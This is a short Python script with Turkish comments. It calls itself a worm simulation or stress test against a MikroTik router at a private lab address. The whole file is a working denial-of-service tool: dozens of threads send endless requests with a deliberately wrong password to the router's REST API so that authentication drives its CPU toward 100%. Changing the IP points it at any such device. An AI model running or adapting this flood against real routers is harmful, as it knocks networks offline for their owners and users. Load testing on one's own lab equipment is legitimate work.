import requests
import threading
import time

# Hedef MikroTik IP adresimiz
hedef_ip = "192.168.56.101"
url = f"http://{hedef_ip}/rest/system/resource"

# Simüle edilecek eşzamanlı bağlantı (solucan) sayısı
# Eğer CPU %80'e ulaşmazsa bu sayıyı 100 veya 150 yapabilirsin.
thread_sayisi = 50 

def solucan_saldirisi():
    """Hedef cihaza sürekli ve hızlı istek göndererek CPU'yu yoran fonksiyon."""
    while True:
        try:
            # Bilerek yanlış şifre gönderiyoruz ki cihaz kimlik doğrulama işlemi için ekstra CPU harcasın
            requests.get(url, auth=('admin', 'yanlis_sifre'), timeout=1)
        except requests.exceptions.RequestException:
            # Bağlantı koparsa veya yavaşlarsa hatayı yoksay ve devam et
            pass

print(f"⚠️ DİKKAT: {hedef_ip} adresine yönelik Worm Simülasyonu (Stres Testi) başlatılıyor...")
print("Bu işlem MikroTik CPU'sunu hızla %100'e yaklaştıracaktır.")
print("Durdurmak için CTRL+C tuşlarına basın.\n")

time.sleep(3) # Başlamadan önce 3 saniye bekle

# Çoklu iş parçacığı (Multi-threading) ile aynı anda onlarca saldırı başlatıyoruz
threads = []
for i in range(thread_sayisi):
    t = threading.Thread(target=solucan_saldirisi)
    t.daemon = True
    t.start()
    threads.append(t)

try:
    # Ana programı açık tutmak için sonsuz döngü
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nSimülasyon durduruldu. CPU kullanımı normale dönecektir.")